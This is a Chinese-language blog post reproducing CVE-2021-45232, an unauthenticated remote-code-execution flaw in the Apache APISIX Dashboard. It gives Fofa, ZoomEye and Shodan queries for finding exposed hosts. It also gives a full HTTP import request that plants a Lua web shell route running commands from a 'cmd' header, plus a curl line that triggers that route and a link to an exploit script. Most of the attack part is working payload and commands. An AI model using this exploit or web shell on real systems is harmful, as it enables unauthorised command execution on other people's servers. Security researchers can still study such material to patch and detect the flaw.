---
title: Apache APISIX Dashboard RCE
tags:
  - vuln
  - CVE-2021-45232
copyright: true
categories:
  - 漏洞复现
index_img: 'https://s4.ax1x.com/2022/01/05/TvdJgS.png'
banner_img: 'https://s4.ax1x.com/2022/01/05/TvdJgS.png'
abbrlink: af29eede
date: 2022-01-03 22:08:50
---

> CVE-2021-45232  Apache apisix Dashboard api unauth rce Version: < 2.10.1
>
> Fofa: title="Apache APISIX Dashboard" 
>
> Poc: url+/apisix/admin/migrate/export
>
> Exp: url+/apisix/admin/migrate/import


### 0x01 检索

Fofa：`title="Apache APISIX Dashboard"`

ZoomEye：`title:"Apache APISIX Dashboard"`

Shodan：`http.title:"Apache APISIX Dashboard"`

![](https://s4.ax1x.com/2022/01/05/TvdJgS.png)

### 0x02 检测

能访问 http://x.x.x:9000/apisix/admin/migrate/export 则说明存在未授权访问配置文件，大概率可进行rce。

![](https://s4.ax1x.com/2022/01/05/TvdG38.png)

### 0x03 利用

向 /apisix/admin/migrate/import 构造数据包提交，添加路由：

```sqlite
POST /apisix/admin/migrate/import HTTP/1.1
Host: x.x.x.x:9000
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 666
Content-Type: multipart/form-data; boundary=f82165b5e633b8e3fba86bbf468e1546

--f82165b5e633b8e3fba86bbf468e1546
Content-Disposition: form-data; name="file"; filename="data"
Content-Type: text/data

{"Counsumers": [], "Routes": [{"id": "673366244208765680", "create_time": 1640674554, "update_time": 1640677637, "uris": ["/QeMpHt"], "name": "QeMpHt", "methods": ["GET", "POST"], "script": "local file=io.popen(ngx.req.get_headers()['cmd'],'r') \n local output=file:read('*all') \n file:close() \n ngx.say(output)", "status": 1}], "Services": [], "SSLs": [], "Upstreams": [], "Scripts": [], "GlobalPlugins": [], "PluginConfigs": []}xxxx #这里有不可见字符
--f82165b5e633b8e3fba86bbf468e1546--

```

curl 请求 apisix 管理端口9080+ `uris`中的 `/QeMpHt`, 即：

```bash
curl http://x.x.x.x:9080/QeMpHt -H "cmd: ifconfig" 
```

![](https://s4.ax1x.com/2022/01/05/TvdYjg.png)

使用poython提交数据、执行命令。 

py脚本: https://github.com/Kuibagit/CVE-2021-45232-RCE

![](https://s4.ax1x.com/2022/01/05/TvdNuQ.png)

Reference

https://mp.weixin.qq.com/s/Me2bjRtmBQv--Aj9I_2cwg

https://www.o2oxy.cn/3945.html

